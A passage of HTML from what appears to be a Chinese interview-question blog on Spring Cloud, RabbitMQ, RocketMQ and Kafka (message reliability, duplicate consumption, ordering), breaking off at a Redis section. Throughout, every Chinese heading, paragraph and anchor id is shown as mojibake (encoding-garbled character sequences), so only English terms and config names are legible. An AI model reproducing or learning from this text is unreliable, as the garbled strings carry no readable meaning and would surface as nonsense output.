<li>Eurekaçš„æœåŠ¡å‘ç°éœ€è¦ä¸»åŠ¨å»æ‹‰å–ï¼ŒZookeeperæœåŠ¡å‘ç°æ˜¯ç›‘å¬æœºåˆ¶<ul>
<li>eurekaä¸­è·å–æœåŠ¡åˆ—è¡¨åä¼šç¼“å­˜èµ·æ¥ï¼Œæ¯éš”30ç§’é‡æ–°æ‹‰å–æœåŠ¡åˆ—è¡¨</li>
<li>zookeeperåˆ™æ˜¯ç›‘å¬èŠ‚ç‚¹ä¿¡æ¯å˜åŒ–ï¼Œå½“æœåŠ¡èŠ‚ç‚¹ä¿¡æ¯å˜åŒ–æ—¶ï¼Œå®¢æˆ·ç«¯ç«‹å³å°±å¾—åˆ°é€šçŸ¥</li>
</ul>
</li>
</ul>
<h2 id="2-4-SpringCloudä¸­çš„å¸¸ç”¨ç»„ä»¶æœ‰å“ªäº›ï¼Ÿ"><a href="#2-4-SpringCloudä¸­çš„å¸¸ç”¨ç»„ä»¶æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="2.4.SpringCloudä¸­çš„å¸¸ç”¨ç»„ä»¶æœ‰å“ªäº›ï¼Ÿ"></a>2.4.SpringCloudä¸­çš„å¸¸ç”¨ç»„ä»¶æœ‰å“ªäº›ï¼Ÿ</h2><p>å¸¸è§ç»„ä»¶ï¼š</p>
<ul>
<li>SpringCloudNetflixï¼š<ul>
<li>Eurekaï¼šæ³¨å†Œä¸­å¿ƒï¼Œå¯ä»¥ç”¨Zookeeperå’ŒConsulä»£æ›¿</li>
<li>Ribbonï¼šè´Ÿè½½å‡è¡¡å™¨</li>
<li>Hystrixï¼šæ–­è·¯å™¨</li>
<li>Zuulï¼šç½‘å…³ï¼Œå¯ä»¥ç”¨SpringCloudGatewayä»£æ›¿</li>
</ul>
</li>
<li>SpringCloudBusï¼šæ¶ˆæ¯æ€»çº¿ï¼Œé»˜è®¤åŸºäºRabbitMQå’ŒKafkaå®ç°</li>
<li>SpringCloudConfigï¼šç»Ÿä¸€é…ç½®ä¸­å¿ƒï¼Œåˆ†ä¸ºserverç«¯å’Œclientç«¯</li>
<li>SpringCloudStreanï¼šæ•°æ®æµå¤„ç†ï¼Œé»˜è®¤åŸºäºRabbitMQå’ŒKafka</li>
<li>SpringCloudSleuthï¼šç»“åˆSpringCloudZipkinå®ç°é“¾è·¯è¿½è¸ª</li>
</ul>
<h1 id="3-RabbitMQå¸¸è§é¢è¯•é¢˜"><a href="#3-RabbitMQå¸¸è§é¢è¯•é¢˜" class="headerlink" title="3.RabbitMQå¸¸è§é¢è¯•é¢˜"></a>3.RabbitMQå¸¸è§é¢è¯•é¢˜</h1><h2 id="3-1-ä½ ä»¬å…¬å¸ä¸ºä»€ä¹ˆé€‰æ‹©äº†RabbitMQäº§å“ï¼Œè€Œä¸æ˜¯RocketMQå’ŒKafkaï¼ˆé—®åŒºåˆ«ï¼‰ï¼Ÿ"><a href="#3-1-ä½ ä»¬å…¬å¸ä¸ºä»€ä¹ˆé€‰æ‹©äº†RabbitMQäº§å“ï¼Œè€Œä¸æ˜¯RocketMQå’ŒKafkaï¼ˆé—®åŒºåˆ«ï¼‰ï¼Ÿ" class="headerlink" title="3.1.ä½ ä»¬å…¬å¸ä¸ºä»€ä¹ˆé€‰æ‹©äº†RabbitMQäº§å“ï¼Œè€Œä¸æ˜¯RocketMQå’ŒKafkaï¼ˆé—®åŒºåˆ«ï¼‰ï¼Ÿ"></a>3.1.ä½ ä»¬å…¬å¸ä¸ºä»€ä¹ˆé€‰æ‹©äº†RabbitMQäº§å“ï¼Œè€Œä¸æ˜¯RocketMQå’ŒKafkaï¼ˆé—®åŒºåˆ«ï¼‰ï¼Ÿ</h2><p>è¿™ä¸ªé—®é¢˜å…¶å®æ—¶é—®3ç§MQçš„å·®åˆ«ï¼Œå…ˆçœ‹ä¸€å¼ å›¾ï¼š</p>
<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th>RabbitMQ</th>
<th>RocketMQ</th>
<th>kafka</th>
</tr>
</thead>
<tbody><tr>
<td>å¼€å‘è¯­è¨€</td>
<td>erlang</td>
<td>java</td>
<td>scala</td>
</tr>
<tr>
<td>å•æœºååé‡</td>
<td>ä¸‡çº§</td>
<td>10ä¸‡çº§</td>
<td>10ä¸‡çº§</td>
</tr>
<tr>
<td>æ—¶æ•ˆæ€§</td>
<td>usçº§</td>
<td>msçº§</td>
<td>msçº§ä»¥å†…</td>
</tr>
<tr>
<td>å¯ç”¨æ€§</td>
<td>é«˜(ä¸»ä»æ¶æ„)</td>
<td>éå¸¸é«˜(åˆ†å¸ƒå¼æ¶æ„)</td>
<td>éå¸¸é«˜(åˆ†å¸ƒå¼æ¶æ„)</td>
</tr>
<tr>
<td>åŠŸèƒ½ç‰¹æ€§</td>
<td>åŸºäºerlangå¼€å‘ï¼Œæ‰€ä»¥å¹¶å‘èƒ½åŠ›å¾ˆå¼ºï¼Œæ€§èƒ½æå…¶å¥½ï¼Œå»¶æ—¶å¾ˆä½;ç®¡ç†ç•Œé¢è¾ƒä¸°å¯Œ</td>
<td>MQåŠŸèƒ½æ¯”è¾ƒå®Œå¤‡ï¼Œæ‰©å±•æ€§ä½³</td>
<td>åªæ”¯æŒä¸»è¦çš„MQåŠŸèƒ½ï¼Œåƒä¸€äº›æ¶ˆæ¯æŸ¥è¯¢ï¼Œæ¶ˆæ¯å›æº¯ç­‰åŠŸèƒ½æ²¡æœ‰æä¾›ï¼Œæ¯•ç«Ÿæ˜¯ä¸ºå¤§æ•°æ®å‡†å¤‡çš„ï¼Œåœ¨å¤§æ•°æ®é¢†åŸŸåº”ç”¨å¹¿ã€‚</td>
</tr>
</tbody></table>
<p>ä¸­å°å‹è½¯ä»¶å…¬å¸ï¼Œå»ºè®®é€‰RabbitMQï¼ŒåŸå› ï¼š</p>
<ul>
<li>erlangè¯­è¨€å¤©ç”Ÿå…·å¤‡é«˜å¹¶å‘çš„ç‰¹æ€§ï¼Œè€Œä¸”ä»–çš„ç®¡ç†ç•Œé¢ç”¨èµ·æ¥ååˆ†æ–¹ä¾¿ã€‚</li>
<li>RabbitMQçš„ç¤¾åŒºååˆ†æ´»è·ƒï¼Œå¯ä»¥è§£å†³å¼€å‘è¿‡ç¨‹ä¸­é‡åˆ°çš„bugï¼Œè¿™ç‚¹å¯¹äºä¸­å°å‹å…¬å¸æ¥è¯´ååˆ†é‡è¦ã€‚</li>
<li>ä¸è€ƒè™‘rocketmqå’Œkafkaçš„åŸå› æ˜¯ï¼Œä¸€æ–¹é¢ä¸­å°å‹è½¯ä»¶å…¬å¸ä¸å¦‚äº’è”ç½‘å…¬å¸ï¼Œæ•°æ®é‡æ²¡é‚£ä¹ˆå¤§ï¼Œé€‰æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œåº”é¦–é€‰åŠŸèƒ½æ¯”è¾ƒå®Œå¤‡çš„ï¼Œæ‰€ä»¥kafkaæ’é™¤ã€‚</li>
<li>ä¸è€ƒè™‘rocketmqçš„åŸå› æ˜¯ï¼Œrocketmqæ˜¯é˜¿é‡Œå‡ºå“ï¼Œå¦‚æœé˜¿é‡Œæ”¾å¼ƒç»´æŠ¤rocketmqï¼Œä¸­å°å‹å…¬å¸ä¸€èˆ¬æŠ½ä¸å‡ºäººæ¥è¿›è¡Œrocketmqçš„å®šåˆ¶åŒ–å¼€å‘ï¼Œå› æ­¤ä¸æ¨èã€‚</li>
</ul>
<p>RabbitMQçš„ç¼ºç‚¹ï¼š</p>
<ul>
<li>è™½ç„¶RabbitMQæ˜¯å¼€æºçš„ï¼Œç„¶è€Œå›½å†…æœ‰å‡ ä¸ªèƒ½å®šåˆ¶åŒ–å¼€å‘erlangçš„ç¨‹åºå‘˜å‘¢</li>
</ul>
<p>å¦‚æœæœ‰å¤§æ•°æ®çš„éœ€æ±‚ï¼Œä¾‹å¦‚æ—¥å¿—è®°å½•ã€ç¨‹åºè¿è¡Œé“¾è·¯è¿½è¸ªçš„è®°å½•ï¼Œå¯ä»¥ä½¿ç”¨Kafkaæ¥åšMQï¼Œæ¯•ç«Ÿååé‡æ¯”è¾ƒå¤§ã€‚</p>
<h2 id="3-2-åœ¨é¡¹ç›®ä¸­å“ªäº›åœ°æ–¹ä½¿ç”¨äº†MQï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#3-2-åœ¨é¡¹ç›®ä¸­å“ªäº›åœ°æ–¹ä½¿ç”¨äº†MQï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="3.2.åœ¨é¡¹ç›®ä¸­å“ªäº›åœ°æ–¹ä½¿ç”¨äº†MQï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>3.2.åœ¨é¡¹ç›®ä¸­å“ªäº›åœ°æ–¹ä½¿ç”¨äº†MQï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2><p>è¿™ä¸ªé—®é¢˜ä¸»è¦é—®çš„æ—¶MQçš„ä½œç”¨ï¼ŒåŒ…æ‹¬ä¸‹åˆ—å‡ ç‚¹ï¼š </p>
<ul>
<li><p>æ•°æ®åŒæ­¥</p>
</li>
<li><p>è§£è€¦åˆ</p>
</li>
<li><p>æµé‡å‰Šå³°</p>
</li>
<li><p>å¼‚æ­¥æ‰§è¡Œ</p>
</li>
<li><p>å»¶è¿Ÿé˜Ÿåˆ—</p>
</li>
</ul>
<h3 id="1ï¼‰è§£è€¦åˆ"><a href="#1ï¼‰è§£è€¦åˆ" class="headerlink" title="1ï¼‰è§£è€¦åˆ"></a>1ï¼‰è§£è€¦åˆ</h3><p>ä¾‹å¦‚é¡¹ç›®ä¸­ å•†å“å¾®æœåŠ¡å¯¹å•†å“å®Œæˆäº†å¢åˆ æ”¹ï¼Œéœ€è¦å¯¹ç´¢å¼•åº“æ•°æ®ã€å•†å“çš„é™æ€é¡µåšå¤„ç†ã€‚ä½†æ˜¯ä¸èƒ½åœ¨å•†å“å¾®æœåŠ¡åµŒå…¥ä»£ç ï¼Œè¿™æ ·ä¼šå‡ºç°è€¦åˆã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142541.png" alt="1574829165382"> </p>
<p>æ­¤æ—¶ï¼Œå¯ä»¥åˆ©ç”¨MQæ¥è§£è€¦ï¼Œè®©å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯é€šçŸ¥ï¼Œè€Œç›¸å…³çš„å…¶å®ƒç³»ç»Ÿç›‘å¬MQå³å¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142542.png" alt="1574829207585"> </p>
<h3 id="2ï¼‰æµé‡å‰Šå³°"><a href="#2ï¼‰æµé‡å‰Šå³°" class="headerlink" title="2ï¼‰æµé‡å‰Šå³°"></a>2ï¼‰æµé‡å‰Šå³°</h3><p>æ•°æ®åº“çš„å¹¶å‘èƒ½åŠ›æœ‰é™ï¼Œå¾€å¾€ç§°ä¸ºä¸šåŠ¡æ‰§è¡Œçš„æ€§èƒ½ç“¶é¢ˆã€‚</p>
<p>ä¾‹å¦‚æˆ‘ä»¬çš„æœåŠ¡åªèƒ½æ”¯æŒ500çš„å¹¶å‘ï¼Œç„¶è€Œåˆæ¯ç§’1000ç”šè‡³æ›´é«˜çš„æœåŠ¡æµé‡æ¶Œå…¥ï¼ŒæœåŠ¡è‚¯å®šä¼šå´©æºƒçš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142543.png" alt="1574829378276"> </p>
<p>æ­¤æ—¶ï¼Œåˆ©ç”¨MQæ¥ä½œä¸ºç¼“å†²ï¼Œå°±åƒå¤§åä¸€æ ·ï¼Œé«˜å¹¶å‘æµé‡æ¶Œå…¥ï¼Œå…ˆæ”¾åˆ°MQä¸­ç¼“å­˜èµ·æ¥ï¼Œåç»­ç³»ç»Ÿå†æ…¢æ…¢å–å‡ºå¹¶å¤„ç†å³å¯ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142544.png" alt="1574829476538"> </p>
<h3 id="3ï¼‰å¼‚æ­¥è°ƒç”¨"><a href="#3ï¼‰å¼‚æ­¥è°ƒç”¨" class="headerlink" title="3ï¼‰å¼‚æ­¥è°ƒç”¨"></a>3ï¼‰å¼‚æ­¥è°ƒç”¨</h3><p>å¦‚æœä¸€ä¸ªä¸šåŠ¡æ‰§è¡Œä¸­ï¼Œéœ€è¦è°ƒç”¨å¤šä¸ªå…¶å®ƒæœåŠ¡ï¼Œä¸šåŠ¡é“¾è·¯å¾ˆé•¿ï¼ŒåŒæ­¥è°ƒç”¨çš„ç”¨æ—¶å°±æ—¶å¤šä¸ªæœåŠ¡æ‰§è¡Œçš„æ€»è€—æ—¶ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142545.png" alt="1574829703693"> </p>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬å¦‚æœå†Bç³»ç»Ÿæ‰§è¡Œå®Œæˆåï¼Œåˆ©ç”¨MQé€šçŸ¥ç³»ç»ŸCå’Œç³»ç»ŸDå»å®Œæˆï¼Œç›´æ¥è¿”å›ç»“æœç»™ç”¨æˆ·ï¼Œå°±å¯ä»¥å‡å°‘ä¸šåŠ¡è€—æ—¶ã€‚è¿™æ ·å°±æŠŠåŒæ­¥é˜»å¡è°ƒç”¨ï¼Œå˜æˆäº†å¼‚æ­¥è°ƒç”¨ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142546.png" alt="1574829932259"> </p>
<h2 id="3-3-å¦‚ä½•ä¿è¯MQçš„é«˜å¯ç”¨"><a href="#3-3-å¦‚ä½•ä¿è¯MQçš„é«˜å¯ç”¨" class="headerlink" title="3.3.å¦‚ä½•ä¿è¯MQçš„é«˜å¯ç”¨"></a>3.3.å¦‚ä½•ä¿è¯MQçš„é«˜å¯ç”¨</h2><p>RabbitMQåº•å±‚æ—¶åŸºäºErlangè¯­è¨€ï¼Œå¯¹åˆ†å¸ƒå¼æ”¯æŒè¾ƒå¥½ã€‚å¹¶ä¸”å®˜æ–¹ä¹Ÿç»™å‡ºäº†æ­å»ºé•œåƒæœºå™¨çš„æ–¹å¼ï¼Œå¯ä»¥æŠŠé˜Ÿåˆ—åŠå…¶ä¸­çš„æ•°æ®åŒæ­¥åˆ°é•œåƒèŠ‚ç‚¹ä¸­ï¼Œå½“é˜Ÿåˆ—æ‰€åœ¨èŠ‚ç‚¹æ•…éšœæ—¶ï¼Œé•œåƒé˜Ÿåˆ—å¯ä»¥ç»§ç»­æä¾›æœåŠ¡ã€‚</p>
<p>å¦å¤–ï¼ŒMQæ•°æ®å¯ä»¥æŒä¹…åŒ–ï¼Œå½“èŠ‚ç‚¹æ¢å¤æ—¶ï¼Œå¯ä»¥æ¢å¤æ•°æ®ã€‚</p>
<p>è€ŒKafkaå’ŒRocketMQæ˜¯é€šè¿‡ä¸»ä»é›†ç¾¤æ–¹æ¡ˆæ¥å®ç°é«˜å¯ç”¨çš„ï¼š</p>
<p>ä»¥rcoketMQä¸ºä¾‹ï¼Œä»–çš„é›†ç¾¤å°±æœ‰å¤šmaster æ¨¡å¼ã€å¤šmasterå¤šslaveå¼‚æ­¥å¤åˆ¶æ¨¡å¼ã€å¤š masterå¤šslaveåŒæ­¥åŒå†™æ¨¡å¼ã€‚RocketMQå¤šmasterå¤šslaveæ¨¡å¼éƒ¨ç½²æ¶æ„å›¾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142547.png" alt="1574830176536"></p>
<p>kafkaï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142548.png" alt="1574830129381"></p>
<h2 id="3-4-å¦‚ä½•ä¿è¯MQçš„æ¶ˆæ¯å¯é æ€§ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±ï¼Ÿ"><a href="#3-4-å¦‚ä½•ä¿è¯MQçš„æ¶ˆæ¯å¯é æ€§ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±ï¼Ÿ" class="headerlink" title="3.4.å¦‚ä½•ä¿è¯MQçš„æ¶ˆæ¯å¯é æ€§ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±ï¼Ÿ"></a>3.4.å¦‚ä½•ä¿è¯MQçš„æ¶ˆæ¯å¯é æ€§ï¼Œé˜²æ­¢æ¶ˆæ¯ä¸¢å¤±ï¼Ÿ</h2><h3 id="1ï¼‰RabbitMQ"><a href="#1ï¼‰RabbitMQ" class="headerlink" title="1ï¼‰RabbitMQ"></a>1ï¼‰RabbitMQ</h3><p>æ¶ˆæ¯ä¸¢å¤±çš„å‡ ç§æƒ…å†µï¼š</p>
<ul>
<li>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯æ—¶ä¸¢å¤±ï¼š<ul>
<li>åˆ©ç”¨RabbitMQæä¾›çš„publisher confirmæœºåˆ¶</li>
</ul>
</li>
<li>MQä¸¢å¤±æ¶ˆæ¯ï¼š<ul>
<li>æ¶ˆæ¯æŒä¹…åŒ–</li>
<li>é•œåƒé›†ç¾¤å¤‡ä»½</li>
</ul>
</li>
<li>æ¶ˆè´¹è€…ä¸¢å¤±æ¶ˆæ¯ï¼šrabbitmqä¸­æ¶ˆæ¯æ¶ˆè´¹åè‡ªåŠ¨åˆ é™¤ï¼Œä¸ä¼šæ°¸ä¹…ä¿ç•™<ul>
<li>æ¶ˆè´¹è€…çš„ç¡®è®¤æœºåˆ¶ï¼Œåœ¨å¤„ç†æ¶ˆæ¯ç»“æŸåï¼Œæ‰‹åŠ¨Acknowledge</li>
</ul>
</li>
</ul>
<h3 id="2ï¼‰kafka"><a href="#2ï¼‰kafka" class="headerlink" title="2ï¼‰kafka"></a>2ï¼‰kafka</h3><p>è¿™é‡Œå…ˆå¼•ä¸€å¼ kafka Replicationçš„<a href="http://www.infoq.com/cn/articles/kafka-analysis-part-2/">æ•°æ®æµå‘å›¾</a><br><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142549.png" alt="image"><br>Produceråœ¨å‘å¸ƒæ¶ˆæ¯åˆ°æŸä¸ªPartitionæ—¶ï¼Œå…ˆé€šè¿‡ZooKeeperæ‰¾åˆ°è¯¥Partitionçš„Leaderï¼Œç„¶åæ— è®ºè¯¥Topicçš„Replication Factorä¸ºå¤šå°‘ï¼ˆä¹Ÿå³è¯¥Partitionæœ‰å¤šå°‘ä¸ªReplicaï¼‰ï¼ŒProduceråªå°†è¯¥æ¶ˆæ¯å‘é€åˆ°è¯¥Partitionçš„Leaderã€‚Leaderä¼šå°†è¯¥æ¶ˆæ¯å†™å…¥å…¶æœ¬åœ°Logã€‚æ¯ä¸ªFolloweréƒ½ä»Leaderä¸­pullæ•°æ®ã€‚<br>é’ˆå¯¹ä¸Šè¿°æƒ…å†µï¼Œå¾—å‡ºå¦‚ä¸‹åˆ†æ</p>
<ul>
<li><p>ç”Ÿäº§è€…ä¸¢æ•°æ®<br>åœ¨kafkaç”Ÿäº§ä¸­ï¼ŒåŸºæœ¬éƒ½æœ‰ä¸€ä¸ªleaderå’Œå¤šä¸ªfollwerã€‚follwerä¼šå»åŒæ­¥leaderçš„ä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸ºäº†é¿å…ç”Ÿäº§è€…ä¸¢æ•°æ®ï¼Œåšå¦‚ä¸‹ä¸¤ç‚¹é…ç½®</p>
<ul>
<li>ç¬¬ä¸€ä¸ªé…ç½®è¦åœ¨producerç«¯è®¾ç½®acks&#x3D;allã€‚è¿™ä¸ªé…ç½®ä¿è¯äº†ï¼ŒfollweråŒæ­¥å®Œæˆåï¼Œæ‰è®¤ä¸ºæ¶ˆæ¯å‘é€æˆåŠŸã€‚</li>
<li>åœ¨producerç«¯è®¾ç½®retries&#x3D;MAXï¼Œä¸€æ—¦å†™å…¥å¤±è´¥ï¼Œè¿™æ— é™é‡è¯•</li>
</ul>
</li>
<li><p>æ¶ˆæ¯é˜Ÿåˆ—ä¸¢æ•°æ®<br>é’ˆå¯¹æ¶ˆæ¯é˜Ÿåˆ—ä¸¢æ•°æ®çš„æƒ…å†µï¼Œæ— å¤–ä¹å°±æ˜¯ï¼Œæ•°æ®è¿˜æ²¡åŒæ­¥ï¼Œleaderå°±æŒ‚äº†ï¼Œè¿™æ—¶zookpeerä¼šå°†å…¶ä»–çš„follweråˆ‡æ¢ä¸ºleader,é‚£æ•°æ®å°±ä¸¢å¤±äº†ã€‚é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œåº”è¯¥åšä¸¤ä¸ªé…ç½®ã€‚</p>
<ul>
<li>replication.factorå‚æ•°ï¼Œè¿™ä¸ªå€¼å¿…é¡»å¤§äº1ï¼Œå³è¦æ±‚æ¯ä¸ªpartitionå¿…é¡»æœ‰è‡³å°‘2ä¸ªå‰¯æœ¬</li>
<li>min.insync.replicaså‚æ•°ï¼Œè¿™ä¸ªå€¼å¿…é¡»å¤§äº1ï¼Œè¿™ä¸ªæ˜¯è¦æ±‚ä¸€ä¸ªleaderè‡³å°‘æ„ŸçŸ¥åˆ°æœ‰è‡³å°‘ä¸€ä¸ªfollowerè¿˜è·Ÿè‡ªå·±ä¿æŒè”ç³»</li>
</ul>
<p>è¿™ä¸¤ä¸ªé…ç½®åŠ ä¸Šä¸Šé¢ç”Ÿäº§è€…çš„é…ç½®è”åˆèµ·æ¥ç”¨ï¼ŒåŸºæœ¬å¯ç¡®ä¿kafkaä¸ä¸¢æ•°æ®</p>
</li>
<li><p>æ¶ˆè´¹è€…ä¸¢æ•°æ®<br>è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯è‡ªåŠ¨æäº¤äº†offsetï¼Œç„¶åä½ å¤„ç†ç¨‹åºè¿‡ç¨‹ä¸­æŒ‚äº†ã€‚kafkaä»¥ä¸ºä½ å¤„ç†å¥½äº†</p>
<ul>
<li>offsetï¼šæŒ‡çš„æ˜¯kafkaçš„topicä¸­çš„æ¯ä¸ªæ¶ˆè´¹ç»„æ¶ˆè´¹çš„ä¸‹æ ‡ã€‚ç®€å•çš„æ¥è¯´å°±æ˜¯ä¸€æ¡æ¶ˆæ¯å¯¹åº”ä¸€ä¸ªoffsetä¸‹æ ‡ï¼Œæ¯æ¬¡æ¶ˆè´¹æ•°æ®çš„æ—¶å€™å¦‚æœæäº¤offsetï¼Œé‚£ä¹ˆä¸‹æ¬¡æ¶ˆè´¹å°±ä¼šä»æäº¤çš„offsetåŠ ä¸€é‚£é‡Œå¼€å§‹æ¶ˆè´¹ã€‚<br>æ¯”å¦‚ä¸€ä¸ªtopicä¸­æœ‰100æ¡æ•°æ®ï¼Œæˆ‘æ¶ˆè´¹äº†50æ¡å¹¶ä¸”æäº¤äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„kafkaæœåŠ¡ç«¯è®°å½•æäº¤çš„offsetå°±æ˜¯49(offsetä»0å¼€å§‹)ï¼Œé‚£ä¹ˆä¸‹æ¬¡æ¶ˆè´¹çš„æ—¶å€™offsetå°±ä»50å¼€å§‹æ¶ˆè´¹ã€‚</li>
<li>è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œæ”¹æˆæ‰‹åŠ¨æäº¤å³å¯ã€‚</li>
</ul>
</li>
</ul>
<h2 id="3-5-å¦‚ä½•é˜²æ­¢MQæ¶ˆæ¯çš„é‡å¤æ¶ˆè´¹ï¼Ÿ"><a href="#3-5-å¦‚ä½•é˜²æ­¢MQæ¶ˆæ¯çš„é‡å¤æ¶ˆè´¹ï¼Ÿ" class="headerlink" title="3.5.å¦‚ä½•é˜²æ­¢MQæ¶ˆæ¯çš„é‡å¤æ¶ˆè´¹ï¼Ÿ"></a>3.5.å¦‚ä½•é˜²æ­¢MQæ¶ˆæ¯çš„é‡å¤æ¶ˆè´¹ï¼Ÿ</h2><p>æ¶ˆæ¯é‡å¤æ¶ˆè´¹äº§ç”Ÿçš„åŸå› ï¼š</p>
<ul>
<li>å› ä¸ºç½‘ç»œæ•…éšœï¼Œå¯¼è‡´ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶å¤±è´¥ï¼Œç”Ÿäº§è€…é‡å‘æ¶ˆæ¯</li>
<li>å› ä¸ºç½‘ç»œæ•…éšœï¼Œå¯¼è‡´ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶å¤±è´¥ï¼ŒMQé‡æ–°æŠ•é€’æ¶ˆæ¯</li>
</ul>
<p>è§£å†³æ€è·¯ï¼šä¿è¯å¤„ç†æ¶ˆæ¯æ¥å£çš„å¹‚ç­‰æ€§ï¼š</p>
<ul>
<li>æŸäº›æ¥å£å¤©ç”Ÿå¹‚ç­‰ï¼Œä¾‹å¦‚æŸ¥è¯¢è¯·æ±‚ï¼Œæ— éœ€å¤„ç†</li>
<li>æŸäº›æ¥å£å¤©ç”Ÿä¸å¹‚ç­‰ï¼Œæ¯”å¦‚æ–°å¢ï¼Œè¿˜æœ‰æŸäº›æ¥å£çš„ä¿®æ”¹åŠŸèƒ½<ul>
<li>èƒ½æ ¹æ®å…·ä½“çš„ä¸šåŠ¡æˆ–çŠ¶æ€æ¥ç¡®å®šçš„ï¼Œåœ¨æ¶ˆè´¹ç«¯é€šè¿‡ä¸šåŠ¡åˆ¤æ–­æ˜¯å¦æ‰§è¡Œè¿‡ï¼Œä¾‹å¦‚æ–°å¢è®¢å•ï¼Œçœ‹çœ‹è®¢å•IDæ˜¯å¦å·²ç»å­˜åœ¨</li>
<li>å¯¹äºæ— æ³•é€šè¿‡ä¸šåŠ¡åˆ¤æ–­çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸€æ¡æ¶ˆæ¯è®¾ç½®å…¨å±€å”¯ä¸€idï¼Œä¿å­˜åˆ°æ•°æ®åº“æˆ–å…¶å®ƒåœ°æ–¹ã€‚æ¶ˆæ¯å¤„ç†å‰å¯¹IDè¿›è¡Œåˆ¤æ–­å³å¯</li>
</ul>
</li>
</ul>
<h2 id="3-6-å¦‚ä½•è§£å†³MQçš„æ¶ˆæ¯å †ç§¯é—®é¢˜ï¼Ÿ"><a href="#3-6-å¦‚ä½•è§£å†³MQçš„æ¶ˆæ¯å †ç§¯é—®é¢˜ï¼Ÿ" class="headerlink" title="3.6.å¦‚ä½•è§£å†³MQçš„æ¶ˆæ¯å †ç§¯é—®é¢˜ï¼Ÿ"></a>3.6.å¦‚ä½•è§£å†³MQçš„æ¶ˆæ¯å †ç§¯é—®é¢˜ï¼Ÿ</h2><p>é€šè¿‡åŒä¸€ä¸ªé˜Ÿåˆ—å¤šæ¶ˆè´¹è€…ç›‘å¬ï¼Œå®ç°æ¶ˆæ¯çš„äº‰æŠ¢ï¼ŒåŠ å¿«æ¶ˆæ¯æ¶ˆè´¹é€Ÿåº¦ã€‚</p>
<h2 id="3-7-å¦‚ä½•ä¿è¯MQæ¶ˆæ¯çš„æœ‰åºæ€§ï¼Ÿ"><a href="#3-7-å¦‚ä½•ä¿è¯MQæ¶ˆæ¯çš„æœ‰åºæ€§ï¼Ÿ" class="headerlink" title="3.7.å¦‚ä½•ä¿è¯MQæ¶ˆæ¯çš„æœ‰åºæ€§ï¼Ÿ"></a>3.7.å¦‚ä½•ä¿è¯MQæ¶ˆæ¯çš„æœ‰åºæ€§ï¼Ÿ</h2><p>æŸä¸ªä¸šåŠ¡å‘å‡ºäº†3æ¡æ¶ˆæ¯ï¼Œè¦æ±‚è¿™3æ¡æ¶ˆæ¯æŒ‰ç…§å‘é€æ—¶çš„é¡ºåºæ‰§è¡Œã€‚</p>
<ul>
<li>ä¸šåŠ¡åŒæ—¶å¯¹å¹¶å‘è¦æ±‚ä¸é«˜ï¼š<ul>
<li>ä¿è¯æ¶ˆæ¯å‘é€æ—¶æœ‰åºåŒæ­¥å‘é€</li>
<li>ä¿è¯æ¶ˆæ¯å‘é€è¢«åŒä¸€ä¸ªé˜Ÿåˆ—æ¥æ”¶</li>
<li>ä¿è¯ä¸€ä¸ªé˜Ÿåˆ—åªæœ‰ä¸€ä¸ªæ¶ˆè´¹è€…</li>
</ul>
</li>
<li>ä¸šåŠ¡åŒæ—¶å¯¹å¹¶å‘è¦æ±‚è¾ƒé«˜ï¼š<ul>
<li>æ»¡è¶³ä¸Šè¿°ç¬¬ä¸€ä¸ªåœºæ™¯çš„æ¡ä»¶</li>
<li>å¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—</li>
<li>æœ‰æ—¶åºè¦æ±‚çš„ä¸€ç»„æ¶ˆæ¯ï¼Œé€šè¿‡hashæ–¹å¼åˆ†æ´¾åˆ°ä¸€ä¸ªå›ºå®šé˜Ÿåˆ—</li>
</ul>
</li>
</ul>
<h1 id="4-Redisç›¸å…³é—®é¢˜"><a href="#4-Redisç›¸å…³é—®é¢˜" class="headerlink" title="4.Redisç›¸å…³é—®é¢˜"></a>4.Redisç›¸å…³é—®é¢˜</h1><h2 id="4-1-Redisä¸Memcacheçš„åŒºåˆ«ï¼Ÿ"><a href="#4-1-Redisä¸Memcacheçš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="4.1.Redisä¸Memcacheçš„åŒºåˆ«ï¼Ÿ"></a>4.1.Redisä¸Memcacheçš„åŒºåˆ«ï¼Ÿ</h2><ul>
